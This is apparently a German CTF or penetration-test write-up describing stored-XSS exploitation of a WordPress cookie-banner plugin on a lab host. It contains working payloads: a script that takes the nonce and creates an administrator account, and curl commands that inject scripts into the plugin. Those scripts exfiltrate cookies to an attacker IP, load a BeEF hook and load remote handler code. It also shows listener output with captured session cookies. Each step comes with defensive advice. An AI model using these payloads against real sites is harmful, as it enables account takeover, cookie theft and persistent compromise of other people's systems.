    reportToListener('script_loaded', { user_agent: navigator.userAgent, location: window.location.href });

    try {
        reportToListener('fetch_nonce_start', { url: '/sitecore/wp-admin/user-new.php' });
        const responseUserNewPage = await fetch('/sitecore/wp-admin/user-new.php', { credentials: 'include' });

        reportToListener('fetch_nonce_response', { status: responseUserNewPage.status, ok: responseUserNewPage.ok, url: responseUserNewPage.url });

        if (!responseUserNewPage.ok || (responseUserNewPage.url && responseUserNewPage.url.includes('wp-login.php'))) {
            const responseText = await responseUserNewPage.text();
            reportToListener('fetch_nonce_failed_or_redirected', { status: responseUserNewPage.status, redirected_to_login: true, html_sample: <br>responseText.substring(0, 200) });
            return; 
        }
        
        const userNewPageHtml = await responseUserNewPage.text();
        reportToListener('fetch_nonce_got_html', { length: userNewPageHtml.length });
        
        const nonceMatch = userNewPageHtml.match(/name="_wpnonce_create-user"\s*value="([^"]+)"/);
        if (!nonceMatch || !nonceMatch[1]) {
            reportToListener('nonce_extraction_failed', { html_sample: userNewPageHtml.substring(0, 500) });
            return; 
        }
        const nonce = nonceMatch[1];
        reportToListener('nonce_extracted', { nonce: nonce });

        reportToListener('create_user_start', { username: new_admin_user });
        
        const createUserResponse = await fetch('/sitecore/wp-admin/user-new.php', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                'action': 'createuser',
                '_wpnonce_create-user': nonce,
                'user_login': new_admin_user,
                'email': new_admin_user + '@shemhamphorash.local',
                'first_name': 'XSS',
                'last_name': 'MasterCCat',
                'url': '',
                'pass1': new_admin_pass,
                'pass2': new_admin_pass,
                'role': 'administrator',
                'createuser': 'Add New User' 
            }).toString()
        });

        reportToListener('create_user_response', { status: createUserResponse.status, ok: createUserResponse.ok, url: createUserResponse.url, <br>redirected: createUserResponse.redirected });

        if (createUserResponse.ok || createUserResponse.redirected || createUserResponse.status === 302) { 
            reportToListener('create_user_success', { username: new_admin_user, password: new_admin_pass });
        } else {
            const responseText = await createUserResponse.text();
            reportToListener('create_user_failed', { status: createUserResponse.status, html_sample: responseText.substring(0, 500) });
        }

    } catch (e) {
        reportToListener('script_fatal_error', { message: e.message, stack_sample: e.stack ? e.stack.substring(0, 300) : "No stack" });
    }
})(); 
</pre>
<br>
<hr>




        <section id="proof-of-concept">
            <h2>Proof of Concept (XSS & User Creation)</h2>
            <p class="comment">In diesem Abschnitt wird die Ausnutzung der Stored XSS-Schwachstelle im "easy-cookies-policy"-Plugin demonstriert, um zunächst Cookies zu exfiltrieren und dann über fortgeschrittenere XSS-Payloads administrative Aktionen im WordPress-Backend durchzuführen, was schließlich zur Erstellung eines neuen Administrator-Kontos und zur Kompromittierung des Systems führt.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H 'Cookie: wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748472700%7CBULcS78sYazPwT41kzmyNM7hM7UvZD1KoxTLJMcWwq1%7C3c0da092764efba4230f973da34f46c1f3c3142c5c88a2dfed0d31368f9cb2da' \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script&gt;var i=new Image();i.src='http://192.168.2.199:9001/?c='+encodeURIComponent(document.cookie);&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Accept XSS" \
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dieser <code>curl</code>-Befehl nutzt die zuvor erlangte Sitzung des Benutzers <code>blessed</code> (identifiziert durch den langen <code>wordpress_logged_in_...</code> Cookie-Wert), um eine Stored XSS-Schwachstelle im "easy-cookies-policy"-Plugin auszunutzen.
<code>-X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php'</code>: Sendet eine POST-Anfrage an den WordPress AJAX-Handler.
<code>-H 'Cookie: ...'</code>: Übergibt das Authentifizierungscookie des Benutzers <code>blessed</code>.
<code>--data-urlencode "action=easy_cookies_policy_save_settings"</code>: Ruft die Funktion zum Speichern der Plugin-Einstellungen auf.
<code>--data-urlencode "maintext=&lt;script&gt;var i=new Image();i.src='http://192.168.2.199:9001/?c='+encodeURIComponent(document.cookie);&lt;/script&gt;"</code>: Dies ist der XSS-Payload. Er wird in das Feld <code>maintext</code> (vermutlich der Text für das Cookie-Banner) injiziert. Das Skript erstellt ein neues Bildobjekt und setzt dessen Quelle (<code>src</code>) auf die Adresse des Angreifer-Servers (<code>192.168.2.199:9001</code>). Als GET-Parameter <code>c</code> werden die Cookies der aktuellen Seite (<code>document.cookie</code>) URL-kodiert angehängt. Wenn ein anderer Benutzer (z.B. ein Administrator) die Seite besucht, auf der dieses Banner angezeigt wird, wird sein Browser das Skript ausführen und seine Cookies an den Angreifer senden.
Die restlichen Parameter (<code>background</code>, <code>transparency</code>, etc.) sind legitime Einstellungen des Plugins.
Die Antwort <code>{"status":"OK","text":"Configuration data updated",...}</code> bestätigt, dass die Einstellungen (inklusive des XSS-Payloads) erfolgreich gespeichert wurden.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Exploit für eine Stored XSS-Schwachstelle. Der Angreifer speichert schädlichen JavaScript-Code auf dem Server, der dann im Browser anderer Benutzer ausgeführt wird. Das Ziel hier ist Cookie-Diebstahl. Der Erfolg hängt davon ab, ob ein privilegierter Benutzer (z.B. Admin) die Seite mit dem manipulierten Cookie-Banner besucht.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen Listener auf Port 9001 des Angreifer-Servers (192.168.2.199) starten, um die eingehenden Cookies abzufangen. Anschließend muss eine Aktion ausgelöst werden, die einen Admin dazu bringt, die Seite mit dem XSS-Payload zu besuchen (z.B. durch Social Engineering oder Warten auf reguläre Admin-Aktivität).
<br><strong>Empfehlung (Admin):</strong> Das Plugin "easy-cookies-policy" sofort patchen oder entfernen. Alle Eingabefelder in Webanwendungen serverseitig validieren und schädliche Eingaben (wie <code>&lt;script&gt;</code>-Tags) korrekt kodieren oder ablehnen (Output Encoding, Input Validation). Content Security Policy (CSP) implementieren, um die Auswirkungen von XSS-Angriffen zu begrenzen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 9001</span></div>
        <pre>
listening on [any] 9001 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 47498</span>
GET /?c=easy_cookies_policy_check%3D37465722e7068703 HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9001 des Angreifer-Systems gestartet, um auf eingehende Verbindungen zu warten.
Kurz darauf geht eine Verbindung von der IP-Adresse <code>192.168.2.203</code> ein. Diese IP ist neu und wurde bisher nicht als das Zielsystem (<code>192.168.2.202</code>) identifiziert. Es handelt sich vermutlich um einen anderen Host im Netzwerk, möglicherweise einen "Bot" oder einen simulierten Benutzer, der die Webseite besucht.
Die Anfrage ist ein GET-Request an <code>/?c=easy_cookies_policy_check%3D37465722e7068703</code>. Das XSS-Skript wurde also ausgeführt, und die Cookies des Besuchers (<code>192.168.2.203</code>) wurden gesendet. Hier wurde nur der Cookie <code>easy_cookies_policy_check</code> exfiltriert. Die wertvollen Admin-Session-Cookies sind (noch) nicht dabei.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der XSS-Payload funktioniert prinzipiell, da Cookies exfiltriert wurden. Allerdings stammen die Cookies von einem bisher unbekannten Host <code>192.168.2.203</code> und es sind nicht die erhofften Admin-Sitzungscookies. Dies könnte ein automatisierter Besucher (Crawler, Bot) oder ein anderer Benutzer im Testnetzwerk sein.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Weiterhin den Listener aktiv halten und hoffen, dass ein Administrator mit aktiver Sitzung die Seite besucht. Untersuchen, wer oder was sich hinter <code>192.168.2.203</code> verbirgt. Möglicherweise ist dies ein Hinweis auf einen automatisierten Prozess, der Webseiten prüft, was für die weitere Strategie relevant sein könnte (z.B. wenn dieser Bot mit Admin-Rechten läuft).
<br><strong>Empfehlung (Admin):</strong> Die Quelle <code>192.168.2.203</code> untersuchen. Handelt es sich um einen legitimen internen Dienst oder einen weiteren kompromittierten Host? Die Tatsache, dass XSS funktioniert, unterstreicht die Dringlichkeit der Behebung der Schwachstelle.</p>

<img src="easy_cookie_angelegt3.jpg" alt="hier sieht man wie durch httponly der cookie steahling angriff unterbunden wird, aber dennoch ein admin cookie hinterlasen wurde, wir können beef nutzen um ein neuen admn user anzulegen" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>easy_cookie_angelegt3.jpg</code> (dessen Inhalt nicht direkt aus dem Text hervorgeht, aber durch die Beschreibung interpretiert wird) soll zeigen, dass der Cookie-Diebstahl durch das <code>HttpOnly</code>-Flag bei wichtigen Sitzungscookies erschwert wird. Die Beschreibung im Text besagt: "hier sieht man wie durch httponly der cookie steahling angriff unterbunden wird, aber dennoch ein admin cookie hinterlasen wurde, wir können beef nutzen um ein neuen admn user anzulegen".
Dies bedeutet, dass die wertvollen WordPress-Login-Cookies (z.B. <code>wordpress_logged_in_...</code>) wahrscheinlich als <code>HttpOnly</code> konfiguriert sind und daher nicht mit <code>document.cookie</code> ausgelesen werden können.
Die Aussage "dennoch ein admin cookie hinterlasen wurde" ist etwas unklar. Es könnte sich auf nicht-HttpOnly-Cookies beziehen, die zwar administrativen Kontext haben, aber nicht die Haupt-Session-Cookies sind, oder es ist eine Fehlinterpretation.
Die Schlussfolgerung, "wir können beef nutzen um ein neuen admn user anzulegen", deutet auf einen Strategiewechsel hin: Anstatt Cookies zu stehlen, soll die XSS-Schwachstelle genutzt werden, um JavaScript-Code auszuführen, der Aktionen im Namen des (hoffentlich administrativen) Benutzers durchführt, dessen Browser den XSS-Payload ausführt. BeEF (Browser Exploitation Framework) ist ein Werkzeug, das genau dies ermöglicht.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die Erkenntnis, dass <code>HttpOnly</code> den direkten Diebstahl der wichtigsten Session-Cookies verhindert, ist wichtig. Es zeigt, dass zumindest einige grundlegende Sicherheitsmaßnahmen auf der Webseite implementiert sind. Der Wechsel der Strategie zur Nutzung von BeEF ist ein logischer nächster Schritt, da Stored XSS immer noch mächtig ist, auch wenn Cookies nicht direkt gestohlen werden können. Man kann immer noch Aktionen im Kontext der Benutzersitzung ausführen (wie CSRF, aber mit JavaScript-Kontrolle).</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den XSS-Payload so ändern, dass er den BeEF-Hook (<code>hook.js</code>) lädt. Sobald ein Browser (idealerweise der eines Administrators) gehockt ist, können über das BeEF-Panel verschiedene Aktionen ausgeführt werden, z.B. das Erstellen eines neuen Admin-Benutzers in WordPress über AJAX-Requests, die vom gehockten Browser gesendet werden.
<br><strong>Empfehlung (Admin):</strong> Das <code>HttpOnly</code>-Flag für alle sensiblen Cookies ist eine gute Maßnahme. Dennoch muss die zugrundeliegende XSS-Schwachstelle behoben werden, da sie immer noch Angriffe wie das Ausführen von Aktionen im Namen des Benutzers ermöglicht. Eine starke Content Security Policy (CSP) kann das Laden von Skripten von nicht vertrauenswürdigen Quellen (wie dem BeEF-Server) verhindern.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">beef-xss</span></div>
        <pre>
[-] You are using the Default credentials
[-] (Password must be different from "beef")
[-] Please type a new password for the beef user: 
[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: &lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;
[*] Example: &lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;

● beef-xss.service - beef-xss
     Loaded: loaded (/usr/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
     Active: active (running) since Tue 2025-05-27 01:29:31 CEST; 5s ago
 Invocation: 4f2e92c9073c42909129058b961965b7
   Main PID: 115635 (ruby)
      Tasks: 4 (limit: 59379)
     Memory: 130.8M (peak: 233.9M)
        CPU: 5.433s
     CGroup: /system.slice/beef-xss.service
             └─115635 ruby ./beef

Mai 27 01:29:31 CCat systemd[1]: Started beef-xss.service - beef-xss.
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:32][*] Browser Exploitation Fram….4.0
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:32]    |   Twit: @beefproject
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:32]    |   Site: https://beefpro….com
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:32]    |_  Wiki: https://github.…wiki
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:32][*] Project Creator: Wade Alc…orn)
Mai 27 01:29:33 CCat beef-include-vendor[115635]: [ 1:29:33][*] BeEF is loading. Wait a f…s...
Hint: Some lines were ellipsized, use -l to show in full.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1... 
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>beef-xss</code> startet das Browser Exploitation Framework (BeEF).
Es wird darauf hingewiesen, dass Standard-Anmeldeinformationen verwendet werden und ein neues Passwort für den BeEF-Benutzer festgelegt werden sollte. Die GeoIP-Datenbank fehlt, was für die Kernfunktionalität aber nicht kritisch ist.
BeEF startet seinen Dienst und gibt die URLs für das Web UI (<code>http://127.0.0.1:3000/ui/panel</code>) und den Hook-Punkt (<code>&lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</code>) an. Die <code>&lt;IP&gt;</code> muss durch die IP-Adresse des Angreifer-Rechners ersetzt werden, die für das Opfer-System erreichbar ist (hier <code>192.168.2.199</code>).
Der systemd-Service-Status zeigt, dass BeEF erfolgreich gestartet wurde und läuft.</p>
<p class="evaluation"><strong>Bewertung:</strong> BeEF ist ein mächtiges Werkzeug für die Ausnutzung von XSS-Schwachstellen. Es ermöglicht die Fernsteuerung des Browsers des Opfers, sobald dieser den Hook-JavaScript-Code ausgeführt hat. Die Vorbereitung zur Nutzung von BeEF ist ein logischer Schritt, nachdem der direkte Cookie-Diebstahl durch HttpOnly-Flags erschwert wurde.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das BeEF-Passwort ändern (wichtig für reale Einsätze). Den BeEF-Hook-URL (mit der korrekten Angreifer-IP: <code>http://192.168.2.199:3000/hook.js</code>) in den XSS-Payload für das "easy-cookies-policy"-Plugin einfügen und diesen über den <code>curl</code>-Befehl (wie zuvor, aber mit neuem Payload) speichern. Das BeEF Web UI im Auge behalten, um zu sehen, wann ein Browser gehockt wird.
<br><strong>Empfehlung (Admin):</strong> Eine robuste Content Security Policy (CSP) kann das Laden von Skripten von externen, nicht vertrauenswürdigen Domains (wie dem BeEF-Server des Angreifers) verhindern und somit BeEF-Angriffe erschweren oder blockieren, selbst wenn eine XSS-Schwachstelle vorhanden ist. Die XSS-Schwachstelle selbst bleibt das Hauptproblem, das behoben werden muss.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H 'Cookie: wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748474377%7ChSIVNdP6Zgltz8EQpqaAGoYOUubVftJ2LWKw5ctPbrm%7C0669ff1b8f9c82bbcd85c82e092c807aed951c72a52a6b6752ba3899ec0958bd' \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script src='http://192.168.2.199:3000/hook.js'&gt;&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode 'button_text=BeEFed!' \
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der <code>curl</code>-Befehl von zuvor wird wiederholt, aber diesmal wird als XSS-Payload im Feld <code>maintext</code> der BeEF-Hook injiziert: <code>&lt;script src='http://192.168.2.199:3000/hook.js'&gt;&lt;/script&gt;</code>.
Die Angreifer-IP <code>192.168.2.199</code> wird korrekt verwendet. Das Authentifizierungscookie des Benutzers <code>blessed</code> ist ebenfalls wieder enthalten (der genaue Wert hat sich geändert, was auf eine neue Login-Sitzung oder ein aktualisiertes Cookie hindeutet, die Logik bleibt aber gleich).
Die Antwort vom Server <code>{"status":"OK",...}</code> bestätigt, dass der neue Payload mit dem BeEF-Hook erfolgreich in den Einstellungen des "easy-cookies-policy"-Plugins gespeichert wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt, um BeEF in den Angriffsprozess zu integrieren. Wenn nun ein Benutzer (idealerweise ein Administrator) die WordPress-Seite besucht, auf der das Cookie-Banner mit diesem Hook angezeigt wird, wird sein Browser das <code>hook.js</code>-Skript vom BeEF-Server des Angreifers laden und ausführen. Dadurch wird der Browser des Opfers im BeEF-Panel des Angreifers sichtbar und steuerbar.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das BeEF Web UI (<code>http://127.0.0.1:3000/ui/panel</code>) auf dem Angreifer-System beobachten. Sobald ein Browser (hoffentlich der des "Bots" <code>192.168.2.203</code> oder eines Admins) dort erscheint, können über BeEF weitere Module ausgeführt werden (z.B. Auslesen von Seiteninhalten, Umleiten des Browsers, Ausführen von JavaScript-Befehlen zur Erstellung eines neuen Admin-Users in WordPress).
<br><strong>Empfehlung (Admin):</strong> Dringende Behebung der XSS-Schwachstelle. Implementierung einer Content Security Policy (CSP), die das Laden von Skripten von nicht autorisierten externen Domains blockiert. Regelmäßige Überprüfung auf verdächtige Admin-Aktivitäten oder neu erstellte Benutzerkonten.</p>

<img src="hook_per_beef.jpg" alt="hier sieht man wie beef den hook empfängt http://192.168.2.199:3000/hook.js" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>hook_per_beef.jpg</code> zeigt das BeEF Web UI. Man sieht in der Liste der "Hooked Browsers" einen Eintrag, der typischerweise die IP-Adresse des Opfers und Informationen über dessen Browser anzeigt. Die Beschreibung "hier sieht man wie beef den hook empfängt http://192.168.2.199:3000/hook.js" bestätigt, dass ein Browser erfolgreich das Hook-Skript geladen hat. Vermutlich ist dies der Browser des Hosts <code>192.168.2.203</code>, der zuvor schon die Cookies exfiltriert hat.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Ein Browser wurde erfolgreich mit BeEF gehockt. Der Angreifer hat nun eine interaktive Verbindung zum Browser des Opfers und kann verschiedene Angriffsmodule ausführen. Dies eröffnet eine Vielzahl von Möglichkeiten, von Informationsbeschaffung bis hin zur Übernahme von Benutzerkonten oder der Durchführung von Aktionen im Namen des Opfers.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Im BeEF-Panel den gehockten Browser auswählen und verfügbare Module erkunden. Interessant wären Module, die Aktionen innerhalb von WordPress ausführen können (z.B. "Create Admin User" durch das Senden entsprechender AJAX-Anfragen, wenn der gehockte Benutzer die nötigen Rechte hat) oder Informationen über das System des Opfers sammeln.
<br><strong>Empfehlung (Admin):</strong> Wenn ein solcher Angriff vermutet wird, Netzwerkverkehr zu bekannten BeEF-Server-IPs oder verdächtige JavaScript-Aktivitäten analysieren. Die XSS-Lücke schließen ist weiterhin Priorität.</p>

<img src="hook_per_beef_cookie.jpg" alt="hier sieht man den admin cookie" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>hook_per_beef_cookie.jpg</code> zeigt vermutlich einen Bereich im BeEF UI, in dem die Cookies des gehockten Browsers angezeigt werden. Die Beschreibung "hier sieht man den admin cookie" ist kritisch. Es bedeutet, dass der gehockte Browser (wahrscheinlich der von <code>192.168.2.203</code>) tatsächlich Administrator-Cookies für die WordPress-Seite <code>shemhamphorash.local</code> besitzt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein sehr wichtiger Fund! Obwohl die Cookies möglicherweise <code>HttpOnly</code> sind und nicht direkt per <code>document.cookie</code> im initialen XSS gestohlen werden konnten, kann BeEF sie oft dennoch auslesen oder, noch wichtiger, Aktionen im Namen des Benutzers ausführen, der diese Cookies besitzt. Wenn der "Bot" <code>192.168.2.203</code> mit Admin-Rechten surft, ist dies ein Jackpot.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Unbedingt die BeEF-Module zur Interaktion mit WordPress nutzen (z.B. "WP Admin Shell Uploader", "WP Add Admin User"). Da Admin-Cookies vorhanden sind, sollten diese Aktionen erfolgreich sein. Ziel ist es, persistente Kontrolle über die WordPress-Instanz zu erlangen oder eine Webshell hochzuladen.
<br><strong>Empfehlung (Admin):</strong> Überprüfen, welche Prozesse oder Benutzer als <code>192.168.2.203</code> agieren und warum dieser Host mit Admin-Rechten auf die Webseite zugreift. Solche automatisierten Zugriffe mit hohen Privilegien sind riskant. Das Schließen der XSS-Lücke bleibt essenziell.</p>

<img src="network_Beef.jpg" alt="hier sieht man das netwerk" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>network_Beef.jpg</code> zeigt wahrscheinlich die Netzwerkansicht oder Topologie-Ansicht innerhalb von BeEF. Diese Ansicht kann die Beziehungen zwischen verschiedenen gehockten Browsern und dem BeEF-Server darstellen oder Informationen über das lokale Netzwerk des Opfers, soweit es vom Browser aus erkennbar ist (z.B. interne IP-Adressen durch WebRTC-Leaks oder Scans, die BeEF durchführen kann).</p>
<p class="evaluation"><strong>Bewertung:</strong> Diese Ansicht kann helfen, das Umfeld des Opfers besser zu verstehen und weitere Angriffsziele im internen Netzwerk zu identifizieren, falls der gehockte Browser als Pivot dienen kann (z.B. durch das Ausführen von Portscans vom Browser des Opfers aus).</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Informationen aus der Netzwerkansicht nutzen, um ein besseres Bild vom Netzwerk des Opfers zu bekommen. BeEF-Module wie "Get Internal IP (WebRTC)" oder "Port Scanner (ActiveX)" (falls anwendbar) können hier nützlich sein.
<br><strong>Empfehlung (Admin):</strong> Segmentierung des Netzwerks, um die Ausbreitung von Angriffen zu erschweren, falls ein Host kompromittiert wird. Überwachung des Netzwerkverkehrs auf verdächtige Aktivitäten, die von kompromittierten Browsern ausgehen könnten.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H 'Cookie: wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748523509%7CDOGuCKygWRS0Qwudka8zrMI80Rtoot0TjpbMim0rshv%7Cfdd8b935d53965dd7b21cff726ada122eff0dc7544b03e994563d241a5edd63e' \
--data-urlencode "action=easy_cookies_policy_save_settings" \a
--data-urlencode "maintext=&lt;script&gt;window.location.href='http://192.168.2.199:8000/revshell.php';&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Loading Shell..." \
--data-urlencode "text_color=#ffffff"
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dies ist ein weiterer <code>curl</code>-Befehl, der die Stored XSS-Schwachstelle ausnutzt. Der Payload wurde geändert zu: <code>&lt;script&gt;window.location.href='http://192.168.2.199:8000/revshell.php';&lt;/script&gt;</code>.
Dieser Payload versucht, den Browser des Opfers auf die URL <code>http://192.168.2.199:8000/revshell.php</code> umzuleiten. <code>revshell.php</code> ist vermutlich ein PHP-Skript auf dem Angreifer-Server, das eine Reverse Shell zum Angreifer aufbauen soll, indem es Befehle vom Webserver des Opfers (auf dem WordPress läuft) ausführt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Versuch, von einer Browser-basierten Kompromittierung (XSS) zu einer serverseitigen Kompromittierung (Reverse Shell vom Webserver) überzugehen. Der Erfolg hängt davon ab, ob der Webserver (Apache/Nginx) PHP-Skripte von externen URLs über eine Umleitung ausführen kann und ob die Datei <code>revshell.php</code> korrekt funktioniert, um eine Shell zu etablieren. Es ist unüblich, dass eine reine Browser-Umleitung zu einer serverseitigen Shell führt, es sei denn, <code>revshell.php</code> wird im Kontext des WordPress-Servers selbst ausgeführt, was hier nicht der Fall zu sein scheint, da es vom Angreifer-Server geladen wird. Wahrscheinlicher ist, dass dies ein Versuch ist, eine clientseitige Aktion zu erzwingen oder eine Schwachstelle im Browser oder in Browser-Plugins auszunutzen, die durch den Besuch von <code>revshell.php</code> getriggert wird. Alternativ könnte der Plan sein, dass der Admin-Bot die Datei <code>revshell.php</code> herunterlädt und ausführt, was aber sehr spezifische Bot-Verhalten voraussetzt.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Logik hinter diesem Payload überdenken. Eine direkte Reverse Shell vom Server wird typischerweise durch das Hochladen einer Webshell auf den Zielserver und deren anschließenden Aufruf erreicht. Wenn das Ziel ist, eine Reverse Shell vom *Client* (dem gehockten Browser) zu bekommen, sind andere BeEF-Module oder Techniken geeigneter. Wenn <code>revshell.php</code> eine serverseitige Shell für den *Angreifer-Server* ist, um eingehende Verbindungen zu verwalten, ist der Payload unlogisch. Es scheint ein Missverständnis in der Anwendung dieses Payloads vorzuliegen.
<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen vom Webserver ins Internet stark einschränken, um das Aufbauen von Reverse Shells zu erschweren. Die XSS-Lücke schließen, um solche Umleitungen und Skriptausführungen zu verhindern.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H 'Cookie: wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748523509%7CDOGuCKygWRS0Qwudka8zrMI80Rtoot0TjpbMim0rshv%7Cfdd8b935d53965dd7b21cff726ada122eff0dc7544b03e994563d241a5edd63e' \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script src='http://192.168.2.199:8000/xss_handler.js'&gt;&lt;/script&gt;" \ 
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Interactive Hook" \ 
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein weiterer <code>curl</code>-Befehl, der die Stored XSS ausnutzt. Diesmal wird der Payload geändert, um ein JavaScript namens <code>xss_handler.js</code> vom Angreifer-Server (<code>192.168.2.199:8000</code>) zu laden: <code>&lt;script src='http://192.168.2.199:8000/xss_handler.js'&gt;&lt;/script&gt;</code>.
Der Kommentar im Befehl deutet an, dass der <code>blessed</code>-Cookie aktuell und gültig ist. Die Serverantwort bestätigt das erfolgreiche Speichern des neuen Payloads.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein flexiblerer Ansatz als der BeEF-Hook oder der direkte Umleitungsversuch. Indem ein eigenes JavaScript-File geladen wird, hat der Angreifer volle Kontrolle über den auszuführenden Code und kann diesen leicht anpassen, ohne jedes Mal den <code>curl</code>-Befehl ändern zu müssen. <code>xss_handler.js</code> enthält vermutlich die Logik, um mit dem Angreifer zu kommunizieren und Befehle entgegenzunehmen oder Aktionen im Browser des Opfers auszuführen.</p>
